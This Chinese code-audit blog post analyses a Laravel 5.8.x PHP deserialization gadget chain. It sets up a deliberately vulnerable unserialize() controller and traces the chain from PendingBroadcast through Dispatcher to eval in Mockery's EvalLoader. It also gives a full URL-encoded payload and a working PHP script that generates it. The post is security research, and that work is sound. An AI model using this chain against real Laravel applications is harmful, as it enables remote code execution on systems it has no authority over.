---
title: "Laravel v5.8.x Pop Chain"
date: 2019-08-22T13:58:08+08:00
draft: false
tags: ['code','反序列化']
categories: ['代码审计']
---

在@mochazz师傅的博客里看到了Laravel的反序列化pop链，记录一下。

<!--more-->

## 环境准备

1. phpstudy
2. php7.2.10 
3. phpstorm
4. composer

## 搭建环境

### 配置composer

[下载composer.phar](https://mirrors.aliyun.com/composer/composer.phar) 放到php的目录下面，给php配置好环境变量。

在 `composer.phar` 同级目录下新建文件 `composer.bat` ：

```sh
D:\phpStudy\PHPTutorial\php\php-7.2.1-nts> echo @php "%~dp0composer.phar" %*>composer.bat
```

关闭当前的命令行窗口，打开新的命令行窗口进行测试：

```sh
C:\Users\Y4er>composer -V
Composer version 1.9.0 2019-08-02 20:55:32
```

更换国内阿里源

```bash
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
```

### 配置项目

创建laravel项目，注意选择版本

![20190822140805](https://y4er.com/img/uploads/20190822140805.png)

创建Demo控制器

```
E:\code\php\laravel58>php artisan make:controller DemoController
Controller created successfully.
```

配置路由

routes/web.php

```php
<?php
use App\Http\Controllers\DemoController;

Route::get("/", "DemoController@demo");
```

添加 DemoController 控制器的demo方法，代码如下：

![20190822142029](https://y4er.com/img/uploads/20190822142029.png)

```php
<?php

namespace App\Http\Controllers;

class DemoController extends Controller
{
    public function demo()
    {
        if (isset($_GET['c'])) {
            $code = $_GET['c'];
            unserialize($code);
        } else {
            highlight_file(__FILE__);
        }
        return "Welcome to laravel5.8";
    }
}
```

## pop链分析

首先我们要知道 laravel 在反序列化`unserialize($code)`时，如果反序列化对象的类不存在，会尝试去自动加载这个类。

堆栈如下

```php
ClassLoader.php:444, Composer\Autoload\includeFile()	//加载完之后包含类
ClassLoader.php:322, Composer\Autoload\ClassLoader->loadClass()	//加载类
DemoController.php:11, spl_autoload_call()	//对象类不存在 调用自动加载
DemoController.php:11, unserialize()		//反序列化传递过来的参数
DemoController.php:11, App\Http\Controllers\DemoController->demo()	//路由进入控制器
```

接着我们来看下整条pop链，@mochazz师傅的payload

```http
http://php.local/?c=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A18%3A%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3B%7D%7D%7D
```

用phpstorm打个断点来跟踪下。

整条pop链入口点利用的是类`Illuminate\Broadcasting\PendingBroadcast`的`__destruct`方法。

![20190822143707](https://y4er.com/img/uploads/20190822143707.png)

`$this->event`设置为`Dispatcher`类，然后进入`dispatch()`函数

`vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php`

![20190822145626](https://y4er.com/img/uploads/20190822145626.png)

这里要满足if条件，看下`$this->commandShouldBeQueued($command)`

```php
protected function commandShouldBeQueued($command)
{
    return $command instanceof ShouldQueue;
}
```

要$command实现`ShouldQueue`接口，找下

![20190822150408](https://y4er.com/img/uploads/20190822150408.png)

@mochazz师傅用的是`Illuminate\Broadcasting\BroadcastEvent`

然后进入`$this->dispatchToQueue($command)`

![20190822145801](https://y4er.com/img/uploads/20190822145801.png)

出现了`call_user_func`，这时候我们可以调用任意类的方法了，接下来寻找下可利用的类方法。

在类`Mockery\Loader\EvalLoader`的`load`方法中有eval，并且参数可控。

![20190822150655](https://y4er.com/img/uploads/20190822150655.png)

但是要绕过前面的if语句块，也就是让`class_exists($definition->getClassName(), false)`返回false。

```php
public function getClassName(){
    return $this->config->getName();
}
```

我们找一个含有`getName`方法且返回值可控的类，让其返回一个不存在的类名即可绕过if。

`vendor/mockery/mockery/library/Mockery/Generator/MockConfiguration.php` 这个类中有

```php
public function getName()
{
    return $this->name;
}
```

最后进入到`eval("?>" . $definition->getCode());`，

```php
public function getCode()
{
    return $this->code;
}
```

`getCode()`依然可控，这个pop链就结束了。

## 构造exp

```php
<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        protected $event;
        protected $events;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher
    {
        protected $queueResolver;

        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace Illuminate\Broadcasting {
    class BroadcastEvent
    {
        public $connection;

        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}


namespace Mockery\Generator {
    class MockDefinition
    {
        protected $config;
        protected $code = '<?php phpinfo();?>';

        public function __construct($config)
        {
            $this->config = $config;
        }
    }
}

namespace Mockery\Generator {
    class MockConfiguration
    {
        protected $name = '1234';
    }
}

namespace Mockery\Loader {
    class EvalLoader
    {
        public function load(MockDefinition $definition)
        {

        }
    }
}

namespace {
    $Mockery = new Mockery\Loader\EvalLoader();
    $queueResolver = array($Mockery, "load");
    $MockConfiguration = new Mockery\Generator\MockConfiguration();
    $MockDefinition = new Mockery\Generator\MockDefinition($MockConfiguration);
    $BroadcastEvent = new Illuminate\Broadcasting\BroadcastEvent($MockDefinition);
    $Dispatcher = new Illuminate\Bus\Dispatcher($queueResolver);
    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($Dispatcher, $BroadcastEvent);
    echo urlencode(serialize($PendingBroadcast));
}
?>
```

## 参考链接

1. [Laravel5.8.x反序列化链](https://mochazz.github.io/2019/08/05/Laravel5.8.x反序列化链/#POP链1)
2. [Laravel mockery组件反序列化POP链分析](https://xz.aliyun.com/t/5866)

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**